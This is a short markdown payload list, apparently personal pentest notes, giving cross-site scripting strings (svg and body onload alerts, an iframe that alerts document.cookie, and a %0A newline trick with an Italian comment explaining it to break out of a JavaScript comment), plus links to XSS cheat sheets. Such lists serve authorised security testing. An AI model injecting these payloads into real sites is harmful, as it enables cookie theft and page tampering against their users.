# payload-xss

`<svg/onload=alert('XSS')>`

`<BODY ONLOAD=alert('XSS')>`

`<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>`

<i>%0A newline url encoded per mandare a capo il tuo payload. In caso ci sia un commento // %0Aalert(1) </i></br>
`a%0Aalert('XSS');//`

``

``

``

``

``

``

``

``

<!-- `` -->


# REFERENCES:
https://xn4k.github.io/pentest/bug%20bounty/ethical%20hacking/XSS-Filter-Evasion-Cheat-Sheet/
https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
